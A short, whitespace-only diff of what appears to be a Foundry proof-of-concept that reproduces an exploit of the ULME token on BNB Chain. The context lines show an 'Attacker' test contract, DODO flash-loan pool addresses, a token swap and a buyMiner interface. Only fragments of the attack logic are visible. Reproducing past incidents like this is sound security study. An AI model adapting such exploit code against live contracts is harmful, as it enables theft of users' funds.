@@ -27,6 +27,7 @@ address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
 address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
 
 contract Attacker is Test {
+
     IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
     uint256 dodo1Balance;
@@ -249,9 +250,12 @@ contract Attacker is Test {
             ULME.balanceOf(address(this)) - 1, 0, path, address(this), block.timestamp
         );
     }
+
 }
 
 /* -------------------- Interface -------------------- */
 interface IULME is IERC20 {
+
     function buyMiner(address user, uint256 usdt) external returns (bool);
+
 }
